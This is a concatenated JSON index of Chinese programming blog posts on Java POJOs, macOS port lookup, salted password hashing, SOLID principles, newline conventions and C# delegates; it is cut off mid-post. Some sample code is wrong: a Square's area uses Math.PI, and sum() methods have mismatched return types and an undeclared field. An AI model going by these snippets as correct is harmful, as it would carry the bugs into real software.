POJO主要用于数据的传递，即它只能装载数据（作为存储数据的载体），但其本身不具备任何业务逻辑处理能力。 Reference WikiPedia - JavaBeans WikiPedia - POJO Introduction to JavaBeans and its components Difference between DTO, VO, POJO, JavaBeans? Java 帝国之Java bean（下）","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【macOS】 macOS下查看端口被哪个程序占用","date":"2018-02-23T15:17:02.000Z","path":"2018/02/23/【MacOS】macOS下查看端口被哪个程序占用/","text":"查看某端口是否被占用1$ netstat -an | grep &lt;端口号&gt; 如：查看当前8080端口是否被占用： 1$ netstat -an | grep 8080 查看某端口被哪个程序占用1$ lsof -i:&lt;端口号&gt; 如：查看当前8080端口被何程序占用： 1$ lsof -i:8080 杀死某进程根据 PID （进程ID） 杀死指定进程，PID可在执行lsof -i:&lt;端口号&gt;的COMMAND中列出。 1$ sudo kill -9 &lt;PID&gt;","comments":true,"categories":[{"name":"macOS","slug":"macOS","permalink":"http://swsmile.info/categories/macOS/"}],"tags":[{"name":"macOS","slug":"macOS","permalink":"http://swsmile.info/tags/macOS/"}]},{"title":"【Java】 集合类-Java中List的基本使用","date":"2018-02-23T15:05:57.000Z","path":"2018/02/23/【Java】集合类-Java中List的基本使用/","text":"List与ArrayList List是一个接口，而ArrayList是一个类。 List继承了Collection接口 ArrayList实现了List接口 常用方法 add(int index, Object obj)是向指定索引位置添加对象 set(int index, Object obj)是修改指定索引位置的对象 遍历元素1234567891011String a = \"A\", b = \"B\", c = \"C\";List&lt;String&gt; list = new ArrayList&lt;String&gt;();list.add(a);list.add(b);list.add(c);// 遍历元素Iterator&lt;String&gt; it = list.iterator();while (it.hasNext()) &#123; System.out.println(it.next());&#125; 除此遍历方法之外，由于List集合可以通过索引位置访问元素，因此还可以通过for循环遍历集合中元素 123456789String a = \"A\", b = \"B\", c = \"C\";List&lt;String&gt; list = new ArrayList&lt;String&gt;();list.add(a);list.add(b);list.add(c);for (int i = 0; i &lt; list.size(); i++) &#123; System.out.println(list.get(i));&#125; ArrayList与Vector的区别ArrayList不是线程安全的，而Vector是线程安全的。","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Security】用户验证及密码加密存储","date":"2018-02-23T15:02:59.000Z","path":"2018/02/23/【Security】用户验证及密码加密存储/","text":"验证思路的本质验证思路的本质无非是对比当前用户输入的账号密码与正确的（且存储于数据库中的）账号密码是否一致，若一致则认为身份验证通过。 密码存储策略store passwords as plain-text考虑到安全性因素，原始密码当然不能明文直接存储于数据库。 Hash(password)经过散列处理（如MD5），并将散列后的字符串进行存储，是一种存储密码的方法。 因为，散列后的值一般是无法通过特定算法得到原始字段（对应于原始密码）。 Lookup Table Attack（字典法攻击）然而，通过一个很大的哈希映射表，并在表中搜索该MD5值，很有可能就在极短的时间内找到该散列值对应的原始字段。 这种攻击方法本质上是利用给特定的一个哈希函数一个特定的 input ，都一定会得到一个不会改变的 output。因此，攻击者可以提前构造好一个原始字符串到 hash 值的映射表。 最终，如果在这个映射表中找到了一个哈希值时（能不能找到取决于这个映射表有多大），就可以将 hash 值还原成原始密码了。 Rainbow Table Attack（彩虹表攻击）Rainbow Table Attack（彩虹表攻击）是在Lookup Table Attack（字典法攻击）的基础之上，以时间来换空间。 Hash with salt进而，我们采用加盐（salt） + 散列处理的方式。即，在进行散列处理之前，在原始字段的任意固定位置插入特定的字符串（salt值），其作用是让加盐后的散列结果和没有加盐的散列结果不相同，最终使得依赖彩虹表的破解方式以还原出原始密码的概率大大降低。 注意，这里的salt值，应该是为每个密码都生成一个对应的salt值（并将这个salt值明文存储于数据库中）。一个常见的错误，是所有用户的密码使用同样的一个salt值（硬编码（Hard Code），作为一个静态变量存储于执行的程序集中），这样称为盐值复用（Salt Reuse）。 从代码实现的角度来说，在每个用户注册时，用户都需要设置自己的账号和密码。 这时，我们为这个用户生成一个高长度的随机数作为salt值。而不同的用户注册时，都会分别进行一次随机数生成。因此每个用户都对应一个特定的salt值； 将用户设置的原始明文密码+salt值作为一个整体，并进行散列处理，这个结果暂时称为“加盐后的密码散列值”； 将用户账号名、”加盐后的密码散列值“和盐值存储于数据库中； 此后每次用户登录时，将“此时用户尝试进行登录的密码”+“数据库中读取的对应该用户的盐值” 看做一个整体，并进行散列处理计算，若这个结果与“数据库中存储的加盐后的密码散列值”相同，则验证通过。 这样我们就能保证，即使我们的数据库被入侵者获取并全表下载后（拖库），黑客也几乎不可能将用户的登录密码还原出来。 加盐后的密码破解经过加盐后，并不意味着被黑客拖库后就不能还原出原始密码，只是破解的成本被大大提高。 假设加盐值有1000种可能，一张彩虹表100G，如要暴力破解以测试这1000种可能，则需要100GB * 1000 = 10TB 的空间。 更何况我们还可以将salt值设置为一个高长度的随机数，最终使得通过暴力破解或者原始密码的可能性变为微乎其微。 Reference WIKIPEDIA - Salt (cryptography) 设计安全的账号系统的正确姿势 即使被拖库，也可以保证密码不泄露 如何正确对用户密码进行加密？ https://confluence.shopee.io/display/LABS/7.1+Authentication","comments":true,"categories":[{"name":"Security","slug":"Security","permalink":"http://swsmile.info/categories/Security/"}],"tags":[{"name":"Security","slug":"Security","permalink":"http://swsmile.info/tags/Security/"}]},{"title":"【OOP】SOLID 原则","date":"2018-02-23T14:55:05.000Z","path":"2018/02/23/【OOP】SOLID-原则/","text":"缩写 全称 中文 S The Single Responsibility Principle 单一责任原则 O The Open-Closed Principle 开放封闭原则 L Liskov Substitution Principle 里氏替换原则 I The Interface Segregation Principle 接口分离原则 D The Dependency Inversion Principle 依赖倒置原则 单一职责原则（The Single Responsibility Principle） A class should have one and only one reason to change, meaning that a class should have only one job. 理解 一个类只应承担一种责任（single responsibility）； 让一个类只做一件事。如果它需要承担更多的工作，那么就将这个类进行分解（成多个类），这些类中的每个类仍然都只做一件事； 一个类应该有且只有一个去改变它的理由，这意味着一个类应该只负责一项工作（如果这个类负责两项工作，那么就会有两个理由改变其实现的理由）； 把一个事物分离成多个子部分，以便于能够被复用和集中管理。 例子例如，假设我们有一些Shape（形状），并且我们想求所有shape的面积的和。 Shape类1234567891011121314151617public class Circle : Shape&#123; public int radius; public Circle(int radius) &#123; this.radius = radius; &#125;&#125;public class Square : Shape&#123; public int length; public Square(int length) &#123; this.length = length; &#125;&#125; 首先，我们创建shape类，让构造函数设置需要的参数。接下来，我们继续通过创建AreaCalculator类，然后编写求取所提供的shape对象们的面积之和的逻辑。 AreaCalculator类12345678910111213141516171819public class AreaCalculator&#123; protected List&lt;Object&gt; shapes; public AreaCalculator(List&lt;Object&gt; shapes) &#123; this.shapes = shapes; &#125; public List&lt;double&gt; sum() &#123; // logic to sum the areas return 0; &#125; public string output() &#123; return \"&lt;h1&gt;Sum of the areas of provided shapes:\" + sum() + \"&lt;/h1&gt;\"; &#125;&#125; 调用使用AreaCalculator类，我们简单地实例化类，同时传入一个shape数组，并在页面的底部显示输出。 1234567List&lt;Object&gt; shapes = new List&lt;Object&gt;();shapes.Add(new Circle(1));shapes.Add(new Circle(2));shapes.Add(new Square(1));AreaCalculator calculator = new AreaCalculator(shapes);calculator.output(); 分析输出方法的问题在于，AreaCalculator 既包含了求取所提供的shape面积之和的逻辑，还包含了处理输出数据的逻辑，这是违反单一职责原则（SRP）的。 AreaCalculator 类应该只包含对提供的shape进行面积求和，而不应该包括处理输出数据的逻辑。 解决因此，为了解决这个问题，可以创建一个 SumCalculatorOutputter 类，来具体处理对提供shape进行面积求和后如何显示的逻辑。 而且，在上面的例子（ AreaCalculator中的 output()方法），我们采用了以硬编码（Hard Code）的方式将输出格式写死成了HTML。事实上，用户可能不仅仅只需要HTML的输出格式，还需要其他形式的输出格式（如JSON、XML）。 调用SumCalculatorOutputter类按如下方式工作: 12345678910111213List&lt;Object&gt; shapes = new List&lt;Object&gt;();shapes.Add(new Circle(1));shapes.Add(new Circle(2));shapes.Add(new Square(1));AreaCalculator calculator = new AreaCalculator(shapes);calculator.output();SumCalculatorOutputter outputter = new SumCalculatorOutputter(calculator);// output different formalismoutputter.outputJSON();outputter.outputXML();outputter.outputHTML(); 现在，不管需要何种格式的输出数据，皆由SumCalculatorOutputter类具体处理。 开放封闭原则（The Open-Closed Principle）软件实体应该是可扩展的（extensible），而不可修改的 （unmodifiable）。也就是说，对扩展是开放的，而对修改是封闭的。 The open/closed principle states software entities (classes, modules, functions, etc.) should be open for extension, but closed for modification”; that is, such an entity can allow its behaviour to be extended without modifying its source code. 换句话说，当软件要增加新的需求（requirement）时，可以通过扩展来实现新的需求（增加新的代码），且并不需要修改现有的代码。 这就意味着一个类应该能够无需通过修改类的实现，而完成扩展（比如增加新的功能）。 例子让我们看看 AreaCalculator 类，尤其是它的 sum 方法。 12345678910111213141516171819public double sum()&#123; var sum = 0 foreach (var element in this.squares) &#123; // logic to sum the areas if (element is Square) &#123; var length = ((Square)element).length; sum = sum + length* length; &#125; else if (element is Circle) &#123; var r = ((Circle)element).radius; sum = sum + Math.PI * r * r; &#125; &#125; return sum;&#125; 如果我们希望sum()方法能够对更多类型的shape进行面积求和，我们可以添加更多的If / else块来实现。但是，这违背了开放封闭原则。 能让这个sum()方法做的更好的一种方式是，将计算每个Shape求面积的逻辑sum()方法中移出，将它附加到特定的Shape类上，命名为GetArea()。 123456789101112public class Square : Shape&#123; public int length &#123; set; get; &#125; public Square(int length) &#123; this.length = length; &#125; public double GetArea() &#123; return Math.PI * length * length; &#125;&#125; 对Circle类应该做同样的事情，添加GetArea()方法。现在，获取包含任何Shape面积的和就非常简单了，而且当需要增加新的Shape时，只需要增加这个Shape对应的类（且增加对应的GetArea()方法），而不再需要修改现有的代码： 1234567891011121314public class AreaCalculator&#123; // omit some methods public List&lt;double&gt; sum() &#123; var sums = new List&lt;double&gt;(); foreach (Shape element in this.squares) &#123; sums.Add(element.GetArea()); &#125; return sums; &#125;&#125; 里氏替换原则 （Liskov Substitution Principle） 里氏替换原则是指，每一个子类或派生类对象都可以替换它们基类或父类对象，且替换后不会影响原有功能。 Java语言对里氏代换原则的支持对于Java而言，在编译时期，Java语言编译器会检查一个程序是否符合里氏代换，当然这是一个无关实现的、纯语法意义上的检查。 里氏代换要求凡是基类型使用的地方，子类型一定适用，因此子类型必须具备及类型的全部接口。或者说，子类型的接口必须包括全部的及类型的接口，而且还有可能更宽。如果一个Java程序破坏这一条件，Java编译器就会给出编译时期错误。 举例而言，一个基类Base声明了一个public方法 method()，那么其子类型Sub可否将这个方法的访问权限的声明，从public改换成private呢？换言之，子类型可否使用一个更低访问权限的方法private method()，将超类型的方法public method()进行重写（override）呢？ 从里氏代换的角度考察这个问题，就不难得出答案，因为客户端完全有可能调用超类型的公开方法，如果以子类型代之，这个方法却变成了私有的，客户端不能调用。显然这是违反里氏代换法则的，Java编译器根本就不会让这样的程序过关。 例子12345678910111213141516171819202122232425262728//抽象父类电脑public abstract class Computer &#123; public abstract void use();&#125; class IBM extends Computer&#123; @Override public void use() &#123; System.out.println(\"use IBM Computer.\"); &#125;&#125; class HP extends Computer&#123; @Override public void use() &#123; System.out.println(\"use HP Computer.\"); &#125;&#125; public class Client&#123; public static void main(String[] args) &#123; Computer ibm = new IBM(); Computer hp = new HP();//引用基类的地方能透明地使用其子类的对象。 ibm.use(); hp.use(); &#125;&#125; 含义换句话说，子类可以扩展父类的功能，但不能改变父类原有的功能。它包含以下4层含义： 子类可以实现父类的抽象方法，但是不能覆盖父类的非抽象方法。 子类中可以增加自己特有的方法。 当子类覆盖或实现父类的方法时，方法的前置条件（即方法的形参）要比父类方法的输入参数更宽松。 当子类的方法实现父类的抽象方法时，方法的后置条件（即方法的返回值）要比父类更严格。 1 子类可以实现父类的抽象方法，但是不能覆盖父类的非抽象方法在我们做系统设计时，经常会设计接口或抽象类，然后由子类来实现抽象方法，这里使用的其实就是里氏替换原则。子类可以实现父类的抽象方法很好理解，事实上，子类也必须完全实现父类的抽象方法（哪怕写一个空方法，当然不推荐这样做），否则会编译报错。 里氏替换原则的关键点在于不能覆盖父类的非抽象方法。父类中凡是已经实现好的方法，实际上是在设定一系列的规范和契约，虽然它不强制要求所有的子类必须遵从这些规范，但是如果子类对这些非抽象方法任意修改，就会对整个继承体系造成破坏。而里氏替换原则就是表达了这一层含义。 在面向对象的设计思想中，继承这一特性为系统的设计带来了极大的便利性，但是由之而来的也潜在着一些风险。 反例比如，当类C1继承类C时，可以通过添加新方法的方式来完成新增功能，而尽量不要重写父类C中的方法。否则可能带来难以预料的风险，比如： 12345678910111213141516171819202122public class C &#123; public int func(int a, int b)&#123; return a+b; &#125;&#125; public class C1 extends C&#123; @Override public int func(int a, int b) &#123; return a-b; &#125;&#125; public class Client&#123; public static void main(String[] args) &#123; C c = new C1(); System.out.println(\"2+1=\" + c.func(2, 1)); //2+1=1 C c2 = new C(); System.out.println(\"2+1=\" + c2.func(2, 1)); //2+1=3 &#125;&#125; 分析上面的运行结果明显是错误的（我们期望的运行结果：2+1=3）。类C1继承C后，需要增加新功能，类C1并没有新写一个方法，而是直接重写了父类C的func()方法，违背了里氏替换原则。最终引用父类的地方并不能透明的使用子类的对象，导致运行结果出错。 而事实上，我们期待上面的两种调用方式的输出是相同的。 2 子类中可以增加自己特有的方法在继承父类属性和方法的同时，每个子类也都可以有自己的个性，即在父类的基础上扩展自己的功能。前面其实已经提到，当功能扩展时，子类尽量不要重写父类的方法，而是另写一个方法。 所以可以对上面的代码加以更改，使其符合里氏替换原则，代码如下： 123456789101112131415161718public class C &#123; public int func(int a, int b)&#123; return a+b; &#125;&#125; public class C1 extends C&#123; public int func2(int a, int b) &#123; return a-b; &#125;&#125; public class Client&#123; public static void main(String[] args) &#123; C1 c = new C1(); System.out.println(\"2-1=\" + c.func2(2, 1)); &#125;&#125; 运行结果：2-1=1 3 当子类覆盖或实现父类的方法时，方法的前置条件（即方法的形参）要比父类方法的输入参数更宽松1234567891011121314151617181920212223import java.util.HashMap;public class Father &#123; public void func(HashMap m)&#123; System.out.println(\"执行父类...\"); &#125;&#125; import java.util.Map;public class Son extends Father&#123; // Map是一个接口，HashMap是类。HashMap 实现了 Map 接口 public void func(Map m)&#123;//方法的形参比父类的更宽松 System.out.println(\"执行子类...\"); &#125;&#125; import java.util.HashMap;public class Client&#123; public static void main(String[] args) &#123; Father f = new Son();//引用基类的地方能透明地使用其子类的对象。 HashMap h = new HashMap(); f.func(h); &#125;&#125; 运行结果：执行父类… 注意Son类的func方法前面是不能加@Override注解的，因为否则会编译提示报错，因为这并不是重写（Override），而是重载（Overload），因为方法的输入参数不同。 4 当子类的方法实现父类的抽象方法时，方法的后置条件（即方法的返回值）要比父类更严格12345678910111213141516171819202122import java.util.Map;public abstract class Father &#123; public abstract Map func();&#125; import java.util.HashMap;public class Son extends Father&#123; @Override public HashMap func()&#123;//方法的返回值比父类的更严格 HashMap h = new HashMap(); h.put(\"h\", \"执行子类...\"); return h; &#125;&#125; public class Client&#123; public static void main(String[] args) &#123; Father f = new Son();//引用基类的地方能透明地使用其子类的对象。 System.out.println(f.func()); &#125;&#125; 执行结果：{h=执行子类…} 接口分离原则 （The Interface Segregation Principle）不能强迫用户去依赖那些他们不使用的接口。换句话说，使用多个专门的小接口比使用单一的大接口总要好。 例子举个简单的例子： IBird接口包含很多鸟类的行为，包括Fly()行为。现在如果一个Bird类（如 Ostrich 鸵鸟）实现了这个接口，那么它需要实现不必要（或称为没有意义）的Fly()行为（因为 Ostrich 不会飞）。 因此，这个IBird“胖接口” 应该被拆分为两个不同的接口（IBird和IFlyingBird），IFlyingBird 继承自 IBird。 这里如果一种鸟不会飞（如 Ostrich），那它实现 IBird 接口 如果一种鸟会飞(如 KingFisher)，那么它应实现 IFlyingBird 接口 总的来说，就是将接口尽量拆分，使得实现这些接口的类不需要被迫实现在接口中不被需要或没有意义的方法。 仍然以Shape为例，我们知道也有立体Shape，如果我们也想计算 Shape 的体积，我们可以新添加GetVolumn()方法到 Shape这个 Interface 中： 12345public interface Shape&#123; double GetArea(); double GetVolumn();&#125; 这样修改之后，任何我们创建的Shape必须实现GetVolumn()方法，但是我们知道正方形（Square）是平面形状没有体积，所以这个接口将迫使正方形类（Square）实现一个对它来说没有意义方法。 这样做违反了接口隔离原则（ISP）。更好的实践，是新创建一个名为 SolidShape 的接口，它有一个GetVolumn()方法，对于立体形状（比如立方体等等），可以实现这个接口: 123456789public interface Shape&#123; double GetArea();&#125;public interface SolidShape&#123; double GetVolumn();&#125; 依赖反转原则 （The Dependency Inversion Principle）在传统的应用架构中，低层次的组件设计用于被高层次的组件使用，这一点提供了逐步的构建一个复杂系统的可能。在这种结构下，高层次的组件直接依赖于低层次的组件去实现一些任务，但这种对于低层次组件的依赖限制了高层次组件被重用的可行性。 在面向对象编程领域中，依赖反转原则（Dependency inversion principle，DIP）是指一种特定的解耦形式，使得高层次的模块不依赖于低层次的模块的实现细节，依赖关系被颠倒（反转），从而使得低层次模块依赖于高层次模块的需求抽象。 理解 高层次的模块不应依赖低层次的模块，他们都应该依赖于抽象。 抽象不应依赖于具体实现，具体实现应依赖抽象。 高层次的和低层次的对象都应该依赖于相同的抽象接口，一般来说，高层次实体引用接口，而低层次类实现该接口，而不是高层次类直接引用低层次类，以此实现解耦。 应用依赖反转原则同样被认为是应用了适配器模式。 例如：高层的类定义了它自己的适配器接口（高层类所依赖的抽象接口）。被适配的对象同样依赖于适配器接口的抽象（这是当然的，因为它实现了这个接口），同时它的实现则可以使用它自身所在低层模块的代码。通过这种方式，高层组件则不依赖于低层组件，因为它（高层组件）仅间接的通过调用适配器接口多态方法使用了低层组件，而这些多态方法则是由被适配对象以及它的低层模块所实现的。 例子举个例子： 12345678public class PasswordSaver&#123; private MySQLConnection conn; public PasswordSaver(MySQLConnection conn) &#123; this.conn = conn; &#125;&#125; MySQLConnection是低层次模块（用于在保存密码时，连接MySQL数据库），PasswordSaver是高层次模块（用于保存密码）。根据依赖倒置原则，高层次的模块不应依赖低层次的模块，上述代码违反了这一原则，即高层次模块（PasswordSaver）依赖了低层次模块（MySQLConnection）。 同时，如果之后我们希望更换数据库引擎（比如使用SQL Server），那么这时还需要修改PasswordSaver类，这一修改也违反了开闭原则（The Open-Closed Principle）。 因此，PasswordSaver不应该依赖于使用哪种具体的数据库。基于面向接口编程的思想，我们可以创建一个DBConnectionInterface接口，使得PasswordSaver依赖于这个接口（而不再是MySQLConnection）： 1234interface DBConnectionInterface&#123; public bool connect();&#125; DBConnectionInterface接口有一个connect()方法，MySQLConnection 类实现该接口。 在PasswordReminder类的构造函数不再依赖MySQLConnection类，而是依赖DBConnectionInterface接口。 这样做之后，无论管我们是什么类型的数据库，或者当需要更换数据库引擎时，PasswordSaver 类都可以正常工作，且无需修改现有代码。 1234567891011121314151617public class PasswordReminder&#123; private DBConnectionInterface conn; public PasswordReminder(DBConnectionInterface conn) &#123; this.conn = conn; &#125;&#125;class MySQLConnection : DBConnectionInterface&#123; public bool connect() &#123; // do something return true; &#125;&#125; Reference 《Java与模式》 S.O.L.I.D：面向对象设计的头 5 大原则 A Simple DIP Example 设计模式六大原则（2）：里氏替换原则","comments":true,"categories":[{"name":"OOP","slug":"OOP","permalink":"http://swsmile.info/categories/OOP/"}],"tags":[{"name":"OOP","slug":"OOP","permalink":"http://swsmile.info/tags/OOP/"}]},{"title":"【Operating System】换行符","date":"2018-02-23T14:51:15.000Z","path":"2018/02/23/【Operating-System】换行符/","text":"背景在不同操作系统中，会使用不同的换行符来表示换行。 含义换行符包括”回车”（carriage return）和”换行”（line feed）。 默认情况下，Macintosh系统（早期的Mac OS）则使用&lt;回车&gt;（CR），即\\r（用十六进制表示：0D）。 在Unix和较新的Mac系统（指在早期的Mac OS基础上，更换了内核后的Mac系统，包含最新的macOS和MacOSX）中，每行的结尾只有&lt;换行&gt;(LF)，即\\n（用十六进制表示：0A）。而 在Windows中，每行结尾是&lt;回车&gt;&lt;换行&gt;(CRLF)，即\\r\\n（用十六进制表示：）。 这里的“默认情况”是指用户在该系统下，使用系统自带的文本编辑器，自动生成的换行表示符。 然而，我们如果使用Sublime Text、Notepad++等第三方文本编辑器，可以修改默认表示换行符的方式。 如，Sublime中，在Setting-User中设置&quot;default_line_ending&quot;:&quot;unix&quot;。 Reference flip: Newline conversion between Unix, Macintosh and MS-DOS ASCII files","comments":true,"categories":[{"name":"OperatingSystem","slug":"OperatingSystem","permalink":"http://swsmile.info/categories/OperatingSystem/"}],"tags":[{"name":"Operating System","slug":"Operating-System","permalink":"http://swsmile.info/tags/Operating-System/"}]},{"title":"【C#】 C# 委托","date":"2018-02-23T14:49:47.000Z","path":"2018/02/23/【C-】C-委托/","text":"1 含义委托（delegate）本质来说就是一个指向方法（method）的指针（pointer）。 通过这个委托（指针）可以调用（invoke）一个方法；也可以将委托作为一个方法（称为B方法）参数，在调用B方法时将一个委托实例传入（最终实现了将一个方法传递进入另一个方法中）。 2 声明delegate是一个用于声明委托的关键字。 委托的声明与定义方法类型，只是需要多增加delegate关键字，且没有方法体。 1234567891011121314public delegate void Del(string message);// Create a method for a delegate.public static void DelegateMethod(string message)&#123; System.Console.WriteLine(message);&#125;// Instantiate the delegate.Del handler = DelegateMethod;// Call the delegate.handler(&quot;Hello World&quot;); 委托的签名（参数和返回值类型）必须和待委托方法的签名（参数和返回值类型）完全一致。 3 例子例子11234567891011121314151617181920212223242526272829303132public class MrZhang&#123; //其实买车票的悲情人物是小张 public static void BuyTicket() &#123; Console.WriteLine(&quot;NND,每次都让我去买票，鸡人呀！&quot;); &#125;&#125;//小明类class MrMing&#123; //声明一个委托，其实就是个“命令” public delegate void BugTicketEventHandler(); public static void Main(string[] args) &#123; BugTicketEventHandler myDelegate1 = new BugTicketEventHandler(MrZhang.BuyTicket); // 在C# 2.0中，加入了一种更简洁的表达 BugTicketEventHandler myDelegate2 = MrZhang.BuyTicket; myDelegate1(); myDelegate2(); // 执行结果是BugTicketEventHandler()被调用了两次 Console.ReadKey(); &#125;&#125; 这里的执行结果是BugTicketEventHandler()被调用了两次（输出了两次NND,每次都让我去买票，鸡人呀！）， 注意，这里委托的签名（public delegate void BugTicketEventHandler();）和待委托方法的签名（public static void BuyTicket()）完全一致的。 例子2在C# 1.0和此之前，委托仅能被这样表达： 12345678910111213// Declare a delegate.delegate void Del(string str);// Declare a method with the same signature as the delegate.static void Notify(string name)&#123; Console.WriteLine(&quot;Notification received for: &#123;0&#125;&quot;, name);&#125;// Create an instance of the delegate.Del del1 = new Del(Notify); 在C# 2.0中，加入了一种更简洁的表达方式。即，直接用函数的名称赋值给委托实例。 12// C# 2.0 provides a simpler way to declare an instance of Del.Del del2 = Notify; 同时，也可以使用匿名函数（anonymous method）来声明并初始化一个委托实例。 123// Instantiate Del by using an anonymous method.Del del3 = delegate(string name) &#123; Console.WriteLine(&quot;Notification received for: &#123;0&#125;&quot;, name); &#125;; 在C# 3.0中，增加了可以用Lambda表达式（Lambda expression）来实例化委托实例的方式。 12// Instantiate Del by using a lambda expression.Del del4 = name =&gt; &#123; Console.WriteLine(&quot;Notification received for: &#123;0&#125;&quot;, name); &#125;; 委托的应用如前面提到的，我们也可以使用委托，以实现将一个A方法（作为一个B方法的调用参数）传递到B方法内部。回调（callback）则是这样的一种典型的使用方式。 123456789public delegate void Del(string message);public void MethodWithCallback(int param1, int param2, Del callback)&#123; callback(&quot;The number is: &quot; + (param1 + param2).ToString());&#125;//output: The number is: 3MethodWithCallback(1, 2, handler); 说明我们不能将C#中的委托（delegate）完全理解成C语言中的函数指针（即，它允许你传递一个方法到另一个方法）。 delegate有许多函数指针不具备的特点：特点1：函数指针只能指向静态函数，而委托既能指向（引用）静态函数（在C#中以static修饰的函数），也可以引用非静态成员函数。 1234567891011121314151617181920212223242526272829303132333435// Declare a delegatedelegate void Del();class SampleClass&#123; public void InstanceMethod() &#123; System.Console.WriteLine(&quot;A message from the instance method.&quot;); &#125; static public void StaticMethod() &#123; System.Console.WriteLine(&quot;A message from the static method.&quot;); &#125;&#125;class TestSampleClass&#123; static void Main() &#123; SampleClass sc = new SampleClass(); // Map the delegate to the instance method: Del d = sc.InstanceMethod; d(); // Map to the static method: d = SampleClass.StaticMethod; d(); &#125;&#125;/* Output: A message from the instance method. A message from the static method.*/ 在引用非静态成员函数时，委托不仅需要保存对此函数入口地址的引用，还需要保存该函数对应的类实例对象的引用。 特点2：与函数指针相比，委托是面向对象、类型安全、可靠的受控（managed）对象。 也就是说，runtime 能够保证委托指向一个有效的方法，因此你无需担心委托指向了无效的地址或者越界地址。 4 多播委托（Multicast Delegates）委托是一个指向方法的指针，而与普通指针唯一不同的是，委托可以同时指向一个或多个不同的方法，这就是多播委托（Multicast Delegates）。 12345678910111213141516171819202122public class MethodClass&#123; public void Method1(string message) &#123; &#125; public void Method2(string message) &#123; &#125;&#125;MethodClass obj = new MethodClass();Del d1 = obj.Method1;Del d2 = obj.Method2;Del d3 = DelegateMethod;// step1//Both types of assignment are valid.Del allMethodsDelegate = d1 + d2;allMethodsDelegate += d3;// step2//remove Method1allMethodsDelegate -= d1;// copy AllMethodsDelegate while removing d2Del oneMethodDelegate = allMethodsDelegate - d2; 我们可以仅仅简单地通过+和-将不同的方法在一个委托的调用列表（invocation list）中添加或删除。 在这个例子中，经过step1后，委托实例allMethodsDelegate指向了三个方法（Method1()，Method2()，DelegateMethod()），这意味着如果此时调用委托实例（通过allMethodsDelegate()`的方式），这三个方法会依次被执行。 在经过step2后，此时如果调用委托实例，则只有两个方法（Method2()，DelegateMethod()）会被依次执行。 多播委托的应用多播委托被广泛应用在事件处理（event handling）中。即，事件源对象（event source object）发送事件通知（event notification）给已经注册了该事件的事件接受者对象。 当然，在此之前。事件接受者对象首先需要创建一个响应该事件对应的处理方法，再声明一个指向该处理方法的委托，并将该委托实例提供给事件源对象。 这样之后，当该事件发生时，事件源对象就可以通过调用委托，从而调用事件接受者对应的事件响应方法（以完成事件通知）。 Reference 大白话系列之C#委托与事件讲解(一) Delegates (C# Programming Guide)","comments":true,"categories":[{"name":"C#","slug":"C","permalink":"http://swsmile.info/categories/C/"}],"tags":[{"name":"C#","slug":"C","permalink":"http://swsmile.info/tags/C/"}]},{"title":"【C#】 C# 匿名函数","date":"2018-02-23T14:47:10.000Z","path":"2018/02/23/【C-】C-匿名函数/","text":"1 背景当我们使用委托（delegate）时，一个委托实例总是与一个有函数名称的函数相互关联。 即，函数的名称被作为一个参数，赋值给委托实例： 12345678// Declare a delegate:delegate void Del(int x);// Define a named method:void DoWork(int k) &#123; /* ... */ &#125;// Instantiate the delegate using the method as a parameter:Del d = obj.DoWork; 在C# 1.0和此之前，委托仅能被这样表达： 12345678910111213// Declare a delegate.delegate void Del(string str);// Declare a method with the same signature as the delegate.static void Notify(string name)&#123; Console.WriteLine(&quot;Notification received for: &#123;0&#125;&quot;, name);&#125;// Create an instance of the delegate.Del del1 = new Del(Notify); 在C# 2.0中，引入了一种更简洁的表达方式。即，直接用函数的名称赋值给委托实例。 12// C# 2.0 provides a simpler way to declare an instance of Del.Del del2 = Notify; 同时，也可以使用匿名函数（anonymous method）来声明并初始化一个委托实例。 匿名函数是一种不包含函数名称（unnamed），且位于内联语句块（inline block）的函数。 123// Instantiate Del by using an anonymous method.Del del3 = delegate(string name) &#123; Console.WriteLine(&quot;Notification received for: &#123;0&#125;&quot;, name); &#125;; 在C# 3.0中，引入了可以用Lambda表达式（Lambda expression）来实例化委托实例的方式。Lambda表达式从概念上说与匿名函数类似，但更加具有表现力（more expressive）且更简洁（concise） 12// Instantiate Del by using a lambda expression.Del del4 = name =&gt; &#123; Console.WriteLine(&quot;Notification received for: &#123;0&#125;&quot;, name); &#125;; 2 应用由于使用匿名函数时，不需要创建一个单独的方法，从而减少了构造委托实例时的代码开销。 比如，当这个方法只会被一次使用到时，使用匿名函数可能会让代码看起来更干净。 12345678910void StartThread()&#123; System.Threading.Thread t1 = new System.Threading.Thread (delegate() &#123; System.Console.Write(&quot;Hello, &quot;); System.Console.WriteLine(&quot;World!&quot;); &#125;); t1.Start();&#125; 显然，这里开启了一个新线程，我们要在一个方法中执行这个线程要做某些事情。 Reference Delegates with Named vs. Anonymous Methods (C# Programming Guide)","comments":true,"categories":[{"name":"C#","slug":"C","permalink":"http://swsmile.info/categories/C/"}],"tags":[{"name":"C#","slug":"C","permalink":"http://swsmile.info/tags/C/"}]},{"title":"【Programming】函数式编程（Functional Programming）","date":"2018-02-23T14:44:41.000Z","path":"2018/02/23/【Programming】函数式编程/","text":"1 背景函数式编程（functional programming）开始获得越来越多的关注。 2 定义函数式编程（functional programming）的函数是指数学上的函数：给定输入固定的输出，没有副作用。 其主要思想是把运算过程尽量写成一系列嵌套的函数调用。 函数式编程是声明式编程（declarative programming）的一种，主要思想是只需要一步一步地表达计算的逻辑，而不需要关注具体的内部计算逻辑。 声明式语言包括SQL、XQuery。比如在SQL，我们只需要告诉SQL Engine我们需要什么数据（select）、我们想要如何修改数据（增删改），却不需要具体去描述如何获取这些数据，如果实现数据的修改。SQL Engine会自动帮我们完成这些工作。 声明式编程的对立面是命令式编程（imperative programming），命令式编程与过程式编程（Procedural programming）是几乎等同的概念。 声明式编程与命令式编程的主要区别是，后者在完成计算时，需要显式的指明每一步的计算方法（而前者仅仅需要指明做何计算）。 一句话概括，声明式编程只需要说明做什么，而命令式编程需要一步一步描述怎么做。 Further Reading: Functional Programming vs. Imperative Programming (C#) 函数式编程是与面向对象编程（Object-oriented programming）和过程式编程（Procedural programming）并列的编程范式。 函数式编程（functional programming）与面向对象编程（Object-oriented 